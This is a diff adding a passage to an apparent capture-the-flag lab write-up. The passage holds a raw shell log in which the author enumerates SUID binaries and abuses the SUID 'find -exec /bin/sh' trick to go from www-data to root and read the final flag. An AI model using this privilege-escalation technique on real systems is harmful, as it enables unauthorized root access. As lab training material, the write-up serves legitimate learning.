@@ -1213,6 +1213,61 @@ cat flag4.txt
 Can you use this same method to find or access the flag in root?
 
 Probably. But perhaps it's not that easy.  Or maybe it is?
+```
 
+Then to find Flag 5 I was required to learn find -exec flag and then we got to the final flag : 
+```
+/bin/sh: 23: help: not found
+find / -perm -u=s -type f 2>/dev/null
+/bin/mount
+/bin/ping
+/bin/su
+/bin/ping6
+/bin/umount
+/usr/bin/at
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/procmail
+/usr/bin/find
+/usr/sbin/exim4
+/usr/lib/pt_chown
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/sbin/mount.nfs
+find . -exec /bin/sh 
+find: missing argument to `-exec'
+find . -exec /bin/sh;
+find: missing argument to `-exec'
+clear
+TERM environment variable not set.
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+find . -exec /bin/sh \;quit
+find: missing argument to `-exec'
+find . -exec /bin/sh \; -quit
+id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
+ls
+flag4.txt
+cd
+ls
+flag4.txt
+cd ..
+cd ..
+cd /root
+ls
+thefinalflag.txt
+cat thefinalflag.txt
+Well done!!!!
+
+Hopefully you've enjoyed this and learned some new skills.
+
+You can let me know what you thought of this little journey
+by contacting me via Twitter - @DCAU7
 
 ```
+
